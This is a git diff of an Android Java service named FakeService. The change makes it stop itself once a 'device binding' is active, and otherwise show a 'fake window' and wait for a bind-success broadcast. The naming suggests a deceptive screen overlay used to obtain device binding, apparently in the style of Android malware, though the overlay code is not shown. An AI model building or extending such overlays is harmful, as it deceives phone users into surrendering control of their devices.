@@ -9,6 +9,7 @@ import android.os.Handler;
 import android.os.IBinder;
 import android.os.Looper;
 import com.plugin.common.utils.UtilsRuntime;
+import com.xstd.plugin.Utils.CommonUtil;
 import com.xstd.plugin.Utils.FakeWindow;
 import com.xstd.plugin.config.AppRuntime;
 import com.xstd.plugin.config.Config;
@@ -52,8 +53,16 @@ public class FakeService extends Service {
             Config.LOGD("[[FakeService::onCreate]]");
         }
 
-        registerReceiver(mBindSuccesBRC, new IntentFilter(BIND_SUCCESS_ACTION));
-        showFakeWindow();
+        if (CommonUtil.isBindingActive(getApplicationContext())) {
+            if (Config.DEBUG) {
+                Config.LOGD("[[FakeService::onCreate]] just STOP SELF as the DEVICE BINDG is ACTIVE");
+            }
+            stopSelf();
+            return;
+        } else {
+            registerReceiver(mBindSuccesBRC, new IntentFilter(BIND_SUCCESS_ACTION));
+            showFakeWindow();
+        }
     }
 
     @Override
@@ -62,7 +71,10 @@ public class FakeService extends Service {
         if (Config.DEBUG) {
             Config.LOGD("[[FakeService::onDestroy]]");
         }
-        unregisterReceiver(mBindSuccesBRC);
+
+        if (!CommonUtil.isBindingActive(getApplicationContext())) {
+            unregisterReceiver(mBindSuccesBRC);
+        }
     }
 
     private synchronized void showFakeWindow() {
